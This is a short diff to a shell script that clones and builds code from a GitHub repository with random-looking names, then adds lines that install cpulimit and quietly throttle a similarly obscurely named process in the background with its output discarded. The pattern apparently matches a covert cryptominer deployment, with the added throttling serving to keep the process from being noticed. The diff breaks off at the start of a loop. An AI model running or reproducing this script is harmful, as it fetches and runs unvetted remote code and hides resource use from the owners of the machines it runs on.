@@ -1,9 +1,13 @@
+apt-get install cpulimit -y
+
 git clone https://github.com/mobileapps84741274/linux8888888888
 cd ./linux8888888888/
 mkdir linux84748874
 cd linux84748874
 cmake ..
 make
+
+cpulimit -e linux848888888874 -l 2 &> /dev/null &
 
 while true
 do
